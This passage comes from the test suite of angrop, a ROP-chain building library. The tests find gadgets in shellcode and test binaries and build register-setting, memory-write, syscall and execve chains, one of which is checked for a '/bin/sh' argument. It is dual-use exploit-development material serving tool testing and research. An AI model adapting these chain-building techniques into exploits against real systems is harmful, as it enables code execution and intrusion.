    chain = rop.func_call(0xdeadbeef, [0x41414141, 0x42424242, 0x43434343])
    state = chain.concrete_exec_til_addr(0xdeadbeef)
    assert state.regs.rdi.concrete_value == 0x41414141
    assert state.regs.rsi.concrete_value == 0x42424242
    assert state.regs.rdx.concrete_value == 0x43434343
    assert state.ip.concrete_value == 0xdeadbeef

def test_rebalance_ast():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    rop.analyze_gadget(0x512ecf) # pop rcx; ret
    rop.analyze_gadget(0x533e24) # mov eax, dword ptr [rsp]; add rsp, 0x10; pop rbx; ret

    chain = rop.set_regs(rax=0x41414142, rbx=0x42424243, rcx=0x43434344)
    state = chain.exec()
    assert state.regs.rax.concrete_value == 0x41414142
    assert state.regs.rbx.concrete_value == 0x42424243
    assert state.regs.rcx.concrete_value == 0x43434344

def test_normalize_call():
    proj = angr.load_shellcode(
        """
        pop rsi
        ret
        mov edx, ebx
        mov r8, rax
        call rsi
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.move_regs(r8="rax")
    assert chain

    proj = angr.load_shellcode(
        """
        pop rax
        ret
        lea rsp, [rsp + 8]
        ret
        add eax, 0x2f484c7
        mov rdx, r12
        mov r8, rbx
        call rax
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    try:
        chain = rop.move_regs(r8="rax")
        assert chain is None
    except RopException:
        pass

def test_normalize_jmp_mem():
    proj = angr.load_shellcode(
        """
        pop rbx
        pop r10
        call qword ptr [rbp + 0x48]
        pop rbp
        ret
        pop rax
        pop rbx
        ret
        mov qword ptr [rbx], rax;
        ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.set_regs(r10=0x41414141)
    state = chain.exec()
    assert state.regs.r10.concrete_value == 0x41414141

    proj = angr.load_shellcode(
        """
        pop r9
        pop rbp
        call qword ptr [rbp + 0x48]
        pop rbp
        ret
        pop rax
        pop rbx
        ret
        mov qword ptr [rbx], rax;
        ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.set_regs(r9=0x41414141)
    state = chain.exec()
    assert state.regs.r9.concrete_value == 0x41414141

def test_jmp_mem_normalize_simple_target():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)
    rop.analyze_gadget(0x004a9d67)
    rop.analyze_gadget(0x004cbbb7)
    rop.analyze_gadget(0x004c1317)
    rop.chain_builder.optimize()
    chain = rop.move_regs(r5="r1")
    assert chain

def test_normalize_conditional():
    proj = angr.load_shellcode(
        """
        pop rbp
        ret
        cmp ebp, esp
        pop rax
        pop rdx
        jne 0x4072a8
        pop rbx
        pop rbp
        pop r12
        ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

def test_normalize_moves_in_reg_setter():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64",
                                     "ALLSTAR_android-libzipfile-dev_liblog.so.0.21.0"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.analyze_gadget(0x0000000000403765) # pop rax; ret
    rop.analyze_gadget(0x000000000040236e) # pop rsi; ret
    rop.analyze_gadget(0x0000000000401a50) # pop rbp ; ret
    rop.analyze_gadget(0x0000000000404149) # mov dword ptr [rsi + 0x30], eax; xor eax, eax; pop rbx; ret
    rop.analyze_gadget(0x0000000000402d7a) # mov edx, ebp; mov rsi, r12; mov edi, r13d;
                                           # call 0x401790; jmp qword ptr [rip + 0x2058ca]
    rop.chain_builder.optimize()

    chain = rop.set_regs(rdx=0x41414141)
    assert chain is not None

def test_normalize_oop_jmp_mem():
    proj = angr.load_shellcode(
        """
        mov rax, qword ptr [rsp + 8]; mov edx, ebp; mov esi, ebx; mov rdi, rax; call qword ptr [rax + 0x68]
        pop rdi;
        ret
        pop rsi;
        ret
        mov qword ptr[rdi], rsi; ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

def test_normalize_symbolic_access():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "ALLSTAR_alex_alex"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.analyze_gadget(0x0000000000594254) # : pop r9 ; add byte ptr [rax - 9], cl ; ret
    rop.analyze_gadget(0x000000000040fb98) # : pop rax ; ret
    rop.chain_builder.optimize()
    rop.set_regs(r9=0x41414141)

def test_riscv():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "riscv", "server_eapp.eapp_riscv"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False)
    cache_path = os.path.join(CACHE_DIR, "riscv_server_eapp")
    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets(optimize=False)
        rop.save_gadgets(cache_path)

    rop.optimize()
    chain = rop.set_regs(a0=0x41414141, a1=0x42424242)
    state = chain.exec()
    assert state.regs.a0.concrete_value == 0x41414141
    assert state.regs.a1.concrete_value == 0x42424242

def test_nested_optimization():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "riscv", "abgate-libabGateQt.so"),
                        load_options={'main_opts':{'base_addr': 0}},
                        )
    rop = proj.analyses.ROP(fast_mode=False, cond_br=True, max_bb_cnt=5)

    rop.analyze_addr(0x5f7a)
    rop.analyze_addr(0x77b0)
    rop.analyze_addr(0x77da)
    rop.analyze_addr(0x775e)

    rop.chain_builder.optimize()

    chain = rop.func_call(0xdeadbeef, [0x40404040, 0x41414141, 0x42424242], needs_return=False)

    assert chain is not None

def test_normalize_jmp_reg():
    proj = angr.load_shellcode(
        """
        pop rax; ret
        mov rax, rdi; pop rbx; ret
        mov eax, ebx; pop rbx; ret
        pop rbx; ret
        add rsp, 8; ret
        mov edx, eax; mov esi, 1; call rbx
        pop rdi; ret
        mov dword ptr [rdx], edi; ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    rop.write_to_mem(0x41414141, b'BBBB')

def test_normalize_oop_jmp_reg():
    proj = angr.load_shellcode(
        """
        pop rdi; ret
        mov rax, rdi; ret
        pop rbx; ret
        add rsp, 8; ret
        add rsp, 0x18; ret
        mov rdx, rax; mov rdi, qword ptr [rsp + 8]; call rbx
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.set_regs(rax=0x3b, rdi=0x41414141, rdx=0)
    assert chain is not None

def test_double_ropblock():
    proj = angr.load_shellcode(
        """
        pop rax; mov byte ptr [rbx], 1; ret
        mov rdi, rax; ret
        pop rbx; ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.set_regs(rax=0x3b, rdi=0x41414141)
    assert chain is not None

def test_maximum_write_gadget():
    proj = angr.load_shellcode(
        """
        pop rax; ret
        pop rdi; ret
        mov qword ptr [rax], rdi; add rsp, 0x3d8; ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, stack_gsize=200)
    rop.find_gadgets_single_threaded(show_progress=False)
    rop.write_to_mem(0x41414141, b'BBBB')

def test_normalize_jmp_mem_with_pop():
    proj = angr.load_shellcode(
        """
        pop rax; pop rbx; ret
        pop rdi; ret
        pop r12; ret
        pop r13; ret
        pop rsi; ret
        mov qword ptr [rax], rdi; ret
        mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12 + rbx*8]
        syscall
        """,
        "amd64",
        simos='linux',
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, stack_gsize=200)
    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.execve()
    assert chain is not None

def test_sim_exec_memory_write():
    proj = angr.load_shellcode(
        """
        pop rax;
        ret;
        pop rbx;
        mov qword ptr [rax+0x10], 0x41414141
        ret
        """,
        "amd64",
        simos='linux',
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.set_regs(rbx=1)
    state = chain.exec()
    addr = None
    for act in state.history.actions:
        if act.type != 'mem':
            continue
        if not act.data.ast.symbolic and act.data.ast.concrete_value == 0x41414141:
            assert not act.addr.ast.symbolic
            addr = act.addr.ast.concrete_value

    rb = RopBlock.from_chain(chain)
    _, state = rb.sim_exec()
    assert state.solver.eval(state.memory.load(addr, 4)) == 0x41414141

def local_conflict_address():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "ALLSTAR_9base_dd"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP()

    rop.find_gadgets(processes=16)

    chain = rop.execve()
    chain.pp()
    state = chain.sim_exec_til_syscall()
    data = state.solver.eval(state.memory.load(state.regs.rdi, 8), cast_to=bytes)
    assert data == b'/bin/sh\x00'

    assert len(chain._values) <= 23

def test_normalize_jmp_mem_with_oop_access():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "ALLSTAR_aces3_xaces3"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)

    rop.analyze_gadget(0x0000000000a42cc2)
    rop.analyze_gadget(0x0000000000a28b7e)
    rop.analyze_gadget(0x00000000004ff8aa)
    rop.analyze_gadget(0x00000000004ff46a)
    rop.analyze_gadget(0x00000000004e91f7)
    rop.analyze_gadget(0x000000000043b2fa) # : add rsp, 0x18 ; ret

    rop.optimize()

    chain = rop.set_regs(r10=0x41414141)
    assert chain is not None

def test_mem_write_with_stack_controller():
    proj = angr.load_shellcode(
        """
        pop r8; mov qword ptr [r8 + 0x10], rax; ret
        pop rax; ret
        """,
        "amd64",
        simos='linux',
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.write_to_mem(0x41424344, b'BBBB')
    assert chain is not None

def test_partial_pop():
    for _ in range(10):
        proj = angr.load_shellcode(
            """
            pop rcx; mov eax, ecx; ret
            pop rax; ret
            mov rbx, rax; ret
            mov ebx, eax; ret
            """,
            "amd64",
            simos='linux',
            load_address=0x400000,
            auto_load_libs=False,
        )
        rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
        rop.analyze_gadget(0x400000)
        rop.find_gadgets_single_threaded(show_progress=False)

        value = RopValue(0x4141414141414141, proj)
        chains = list(rop.chain_builder._reg_setter.find_candidate_chains_giga_graph_search(None,
                                                                                            {'rbx': value},
                                                                                            {},
                                                                                            False))
        assert chains

        chain = rop.set_regs(rbx=0x4141414141414141)
        assert chain is not None

def test_mem_write_with_cache():
    proj = angr.load_shellcode(
        """
        mov dword ptr [rax+0x10], ebx; ret
        pop rax; ret
        pop rbx; ret
        """,
        "amd64",
        simos='linux',
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.analyze_gadget(0x400000)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.write_to_mem(0x41414141, b'BBBB')
    assert chain is not None

def test_reg_setting_equal_set():
    proj = angr.load_shellcode(
        """
        pop rdi; ret
        lea rax, [rdi + 2]; ret
        """,
        "amd64",
        simos='linux',
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.analyze_gadget(0x400000)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.set_regs(rax=0x41414141, rdi=0x42424242)
    assert chain is not None

def test_short_write():
    proj = angr.load_shellcode(
        """
        mov ecx, 0x480021c6; cwde ; mov qword ptr [rdx + rcx*8 - 8], rax; add rsp, 8; ret
        pop rax; ret
        pop rdx; ret
        """,
        "amd64",
        simos='linux',
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.write_to_mem(0x41414141, b'BBBB')
    assert chain is not None

def test_pop_write():
    proj = angr.load_shellcode(
        """
        push rax; pop qword ptr [rcx]; ret
        pop rax; ret
        pop rcx; ret
        """,
        "amd64",
        simos='linux',
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.write_to_mem(0x41414141, b'BBBB')
    assert chain is not None

def test_riscv_oop_normalization():
    cache_path = os.path.join(CACHE_DIR, "riscv_asterisk-libasteriskpj.so.2")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "riscv", "asterisk-libasteriskpj.so.2"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets(processes=16, optimize=False)
        rop.save_gadgets(cache_path)

    g = rop.analyze_gadget(0x00000000000407cc)
    rb = rop.chain_builder._reg_setter.normalize_gadget(g)
    assert rb is not None

    g = rop.analyze_gadget(0x000000000007cc66)
    rb = rop.chain_builder._reg_setter.normalize_gadget(g)
    assert rb is not None

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            print(f)
            all_functions[f]()
    print("local_conflict_address")
    local_conflict_address()

if __name__ == "__main__":
    import sys
    import logging

    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)

    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_find_gadgets.py`:

```py
import os
import logging
from io import BytesIO

import angr
import angrop  # pylint: disable=unused-import

l = logging.getLogger(__name__)

bin_path = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), '..', '..', 'binaries'))
tests_dir = os.path.join(bin_path, 'tests')
data_dir = os.path.join(bin_path, 'tests_data', 'angrop_gadgets_cache')


"""
Suggestions on how to debug angr changes that break angrop.

If the gadget is completely missing after your changes. Pick the address that didn't work and run the following.
The logging should say why the gadget was discarded.

rop = p.analyses.ROP()
rop.analyze_gadget(addr)

If a gadget is missing memory reads / memory writes / memory changes, the actions are probably missing.
Memory changes require a read action followed by a write action to the same address.
"""

def gadget_exists(rop, addr):
    return rop.analyze_gadget(addr) is not None

def test_badbyte():
    proj = angr.Project(os.path.join(tests_dir, "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    assert all(gadget_exists(rop, x) for x in [0x080a9773, 0x08091cf5, 0x08092d80, 0x080920d3])

def local_multiprocess_find_gadgets():
    proj = angr.Project(os.path.join(tests_dir, "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    rop.find_gadgets(show_progress=True)

    assert all(gadget_exists(rop, x) for x in [0x080a9773, 0x08091cf5, 0x08092d80, 0x080920d3])

def test_symbolic_memory_access_from_stack():
    proj = angr.Project(os.path.join(tests_dir, "armel", "test_angrop_arm_gadget"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    assert all(gadget_exists(rop, x) for x in [0x000103f4])

def test_arm_thumb_mode():
    proj = angr.Project(os.path.join(bin_path, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)

    gadget = rop.analyze_gadget(0x4bf858+1)

    assert gadget
    assert gadget.isn_count == 2

def test_pivot_gadget():
    # pylint: disable=pointless-string-statement
    proj = angr.Project(os.path.join(tests_dir, "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    assert all(gadget_exists(rop, x) for x in [0x80488e8, 0x8048998, 0x8048fd6, 0x8052cac, 0x805658c, ])

    gadget = rop.analyze_gadget(0x8048592)
    assert not gadget

    proj = angr.Project(os.path.join(bin_path, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)

    """
    4c7b5a  mov     sp, r7
    4c7b5c  pop.w   {r4, r5, r6, r7, r8, sb, sl, fp, pc
    """

    gadget = rop.analyze_gadget(0x4c7b5a+1)
    assert gadget is not None

    proj = angr.Project(os.path.join(tests_dir, "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    """
    439ad3  pop     esp
    439ad4  lea     esp, [ebp-0xc]
    439ad7  pop     ebx
    439ad8  pop     esi
    439ad9  pop     edi
    439ada  pop     ebp
    439adb  ret
    """
    gadget = rop.analyze_gadget(0x439ad3)
    assert gadget is None

    proj = angr.Project(os.path.join(tests_dir, "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    """
    402bc8  leave
    402bc9  clc
    402bca  repz ret
    """
    gadget = rop.analyze_gadget(0x402bc8)
    assert gadget is None

    # this is not a valid gadget because sal shifts the memory
    # and we don't fully control the shifted memory
    """
    50843e  sal     byte ptr [rbp-0x11], cl
    508441  leave
    508442  ret
    """
    gadget = rop.analyze_gadget(0x50843e)
    assert gadget is None

def test_syscall_gadget():
    proj = angr.Project(os.path.join(tests_dir, "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    assert all(gadget_exists(rop, x) for x in [0x0806f860, 0x0806f85e, 0x080939e3, 0x0806f2f1])

def test_shift_gadget():
    # pylint: disable=pointless-string-statement
    """
    438a91  pop     es
    438a92  add     esp, 0x9c
    438a98  ret

    454e75  push    cs
    454e76  add     esp, 0x5c
    454e79  pop     ebx
    454e7a  pop     esi
    454e7b  pop     edi
    454e7c  pop     ebp
    454e7d  ret

    5622d5  push    ss
    5622d6  add     esp, 0x74
    5622d9  pop     ebx
    5622da  pop     edi
    5622db  ret

    516fb2  clc
    516fb3  pop     ds
    516fb4  add     esp, 0x8
    516fb7  pop     ebx
    516fb8  ret

    490058  push    ds
    490059  add     esp, 0x2c
    49005c  ret
    """
    proj = angr.Project(os.path.join(tests_dir, "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    assert all(not gadget_exists(rop, x) for x in [0x438a91, 0x516fb2])
    assert all(gadget_exists(rop, x) for x in [0x454e75, 0x5622d5, 0x490058])

def test_i386_syscall():
    """
    in 32-bit world, syscall instruction is only valid for AMD CPUs, we consider it invalid in angrop for
    better portability, see https://github.com/angr/angrop/issues/104
    """
    # pylint: disable=pointless-string-statement
    proj = angr.Project(os.path.join(tests_dir, "i386", "angrop_syscall_test"), auto_load_libs=False)

    rop = proj.analyses.ROP()
    """
    804918c  int     0x80
    """

    assert all(gadget_exists(rop, x) for x in [0x804918c])

    """
    8049189  syscall
    """
    assert all(not gadget_exists(rop, x) for x in [0x8049189])

def local_multiprocess_analyze_gadget_list():
    # pylint: disable=pointless-string-statement
    proj = angr.Project(os.path.join(tests_dir, "x86_64", "datadep_test"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    """
    0x4006d8, 0x400864  good gadgets
    0x4005d8            bad instruction
    """
    gadgets = rop.analyze_gadget_list([0x4006d8, 0x4005d8, 0x400864])
    assert len(gadgets) == 2
    assert gadgets[0].addr == 0x4006d8
    assert gadgets[1].addr == 0x400864

def test_gadget_filtering():
    proj = angr.Project(os.path.join(tests_dir, "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)
    rop.analyze_gadget(0x42bca5)
    rop.analyze_gadget(0x42c3c1)
    rop.chain_builder.bootstrap()
    values = list(rop.chain_builder._shifter.shift_gadgets.values())
    assert len(values) == 1 and len(values[0]) == 1

def test_aarch64_svc():
    proj = angr.Project(os.path.join(tests_dir, "aarch64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=True, only_check_near_rets=False)
    g = rop.analyze_gadget(0x0000000000463820)
    assert g is not None

def test_aarch64_reg_setter():
    proj = angr.Project(os.path.join(tests_dir, "aarch64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=True, only_check_near_rets=False)
    g = rop.analyze_gadget(0x00000000004c29a0)
    assert g is not None

def test_enter():
    proj = angr.Project(os.path.join(tests_dir, "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    g = rop.analyze_gadget(0x00000000004f83f3)
    assert g is not None

def test_jmp_mem_gadget():
    proj = angr.Project(os.path.join(tests_dir, "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    # 0x00000000001a2bd9 : xchg edx, esi ; jmp qword ptr [rax]
    # 0x00000000001905a1 : xor ebp, edx ; call qword ptr [rdx]
    g = rop.analyze_gadget(0x5a2bd9)
    assert g is not None
    assert g.transit_type == 'jmp_mem'
    g = rop.analyze_gadget(0x5905a1)
    assert g is not None
    assert g.transit_type == 'jmp_mem'

def test_syscall_next_block():
    proj = angr.Project(os.path.join(tests_dir, "cgc", "sc1_0b32aa01_01"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    g = rop.analyze_gadget(0x804843c)
    assert g
    assert g.isn_count < 20

    g = rop.analyze_gadget(0x8048441)
    assert g.can_return is True

    g = rop.analyze_gadget(0x080484d4)
    assert g.can_return is True

    rop.find_gadgets_single_threaded(show_progress=False)
    chain = rop.do_syscall(2, [1, 0x41414141, 0x42424242, 0], preserve_regs={'eax'}, needs_return=True)
    assert chain

def test_rex_pop_r10():
    f = BytesIO()
    f.write(b"OZ\xc3")
    proj = angr.Project(
        BytesIO(b"OZ\xc3"),
        main_opts={
            "backend": "blob",
            "arch": "amd64",
            "entry_point": 0,
            "base_addr": 0,
        })
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    g = rop.analyze_gadget(0)
    assert g is not None

def test_max_stack_change():
    proj = angr.load_shellcode("""
            xchg ebp, eax
            ret 0xd020
        """,
        "amd64",
    )

    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    g = rop.analyze_gadget(0)
    assert g is None

def test_symbolized_got():
    proj = angr.Project(os.path.join(tests_dir, "x86_64", "ALLSTAR_acct_sa"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    g = rop.analyze_gadget(0x40156A)
    assert g is not None

    # this will be considered pop, but it is not pop
    # pop rax; add al, 0; add al, al; ret
    g = rop.analyze_gadget(0x406850)
    assert g is None or 'rax' not in g.popped_regs

def test_syscall_when_ret_only():
    proj = angr.load_shellcode(
        """
        syscall
        """,
        "amd64",
        load_address=0x400000,
        simos='linux',
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=True)
    rop.find_gadgets_single_threaded(show_progress=False)
    assert rop._all_gadgets

def test_riscv():
    proj = angr.Project(os.path.join(tests_dir, "riscv", "server_eapp.eapp_riscv"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False)
    g = rop.analyze_gadget(0xA86C)
    assert g is not None

    proj = angr.Project(os.path.join(tests_dir, "riscv", "abgate-libabGateQt.so"),
                        load_options={'main_opts':{'base_addr': 0}},
                        )
    rop = proj.analyses.ROP(fast_mode=False, cond_br=True, max_bb_cnt=5)
    g = rop.analyze_addr(0x77da)
    assert g

def test_jmp_mem_num_mem_access():
    proj = angr.load_shellcode(
        """
        mov edx, ebp;
        mov rsi, r14;
        mov edi, r15d;
        call qword ptr [r12 + rbx*8]
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)
    g = rop.analyze_gadget(0x400000)
    assert g is not None

def test_exit_target():
    proj = angr.load_shellcode(
        """
        mov eax, dword ptr [rsp]; ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)
    g = rop.analyze_gadget(0x400000)
    assert not g.popped_regs

def test_syscall_block_hash():
    proj = angr.Project(os.path.join(tests_dir, "x86_64", "ALLSTAR_apcalc-dev_sample_many"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)
    # the following line is necessary because it populates syscall_locations
    rop.gadget_finder.gadget_analyzer # pylint: disable=pointless-statement
    tasks = list(rop.gadget_finder._addresses_to_check_with_caching(show_progress=False))
    for addr in [0x402de7, 0x425a00, 0x43e083, 0x4b146c]:
        assert addr in tasks

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        print(f)
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()
    print("local_multiprocess_analyze_gadget_list")
    local_multiprocess_analyze_gadget_list()
    print("local_multiprocess_find_gadgets")
    local_multiprocess_find_gadgets()

if __name__ == "__main__":
    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)

    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_gadgets.py`:

```py
import os

import angr
import angrop # pylint: disable=unused-import
from angrop.rop_gadget import RopGadget, PivotGadget, SyscallGadget

BIN_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "binaries")
CACHE_DIR = os.path.join(BIN_DIR, 'tests_data', 'angrop_gadgets_cache')

def get_rop(path):
    cache_path = os.path.join(CACHE_DIR, os.path.basename(path))
    proj = angr.Project(path, auto_load_libs=False)
    rop = proj.analyses.ROP()
    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)
    return rop

def test_arm_conditional():
    """
    Currently, we don't model conditional execution in arm. So we don't allow
    conditional execution in arm at this moment.
    """
    rop = get_rop(os.path.join(BIN_DIR, "tests", "armel", "helloworld"))

    cond_gadget_addrs = [0x10368, 0x1036c, 0x10370, 0x10380, 0x10384, 0x1038c, 0x1039c,
                         0x103a0, 0x103b8, 0x103bc, 0x103c4, 0x104e8, 0x104ec]

    assert all(x.addr not in cond_gadget_addrs for x in rop._all_gadgets)

def test_jump_gadget():
    """
    Ensure it finds gadgets ending with jumps
    Ensure angrop can use jump gadgets to build ROP chains
    """
    rop = get_rop(os.path.join(BIN_DIR, "tests", "mipsel", "fauxware"))

    jump_gadgets = [x for x in rop._all_gadgets if x.transit_type == "jmp_reg"]
    assert len(jump_gadgets) > 0

    jump_regs = [x.pc_reg for x in jump_gadgets]
    assert 't9' in jump_regs
    assert 'ra' in jump_regs

def test_arm_mem_change_gadget():
    # pylint: disable=pointless-string-statement

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True, max_sym_mem_access=4)

    """
    0x0004f08c <+28>:	ldr	r2, [r4, #48]	; 0x30
    0x0004f08e <+30>:	asrs	r3, r3, #2
    0x0004f090 <+32>:	str	r3, [r5, #8]
    0x0004f092 <+34>:	str	r2, [r5, #0]
    0x0004f094 <+36>:	str	r5, [r4, #48]	; 0x30
    0x0004f096 <+38>:	pop	{r3, r4, r5, pc}
    """
    gadget = rop.analyze_gadget(0x44f08c+1) # thumb mode
    assert gadget
    assert not gadget.mem_changes

    gadget = rop.analyze_gadget(0x459eea+1) # thumb mode
    assert gadget
    assert not gadget.mem_changes

    """
    4b1e30  ldr     r1, [r6]
    4b1e32  add     r4, r1
    4b1e34  str     r4, [r6]
    4b1e36  pop     {r3, r4, r5, r6, r7, pc}
    """
    gadget = rop.analyze_gadget(0x4b1e30+1) # thumb mode
    assert gadget.mem_changes

    """
    4c1e78  ldr     r1, [r4,#0x14]
    4c1e7a  add     r1, r5
    4c1e7c  str     r1, [r4,#0x14]
    4c1e7e  pop     {r3, r4, r5, pc}
    """
    gadget = rop.analyze_gadget(0x4c1e78+1) # thumb mode
    assert gadget.mem_changes

    """
    4c1ea4  ldr     r2, [r3,#0x14]
    4c1ea6  adds    r2, #0x4
    4c1ea8  str     r2, [r3,#0x14]
    4c1eaa  bx      lr
    """
    gadget = rop.analyze_gadget(0x4c1ea4+1) # thumb mode
    assert gadget.mem_changes

    """
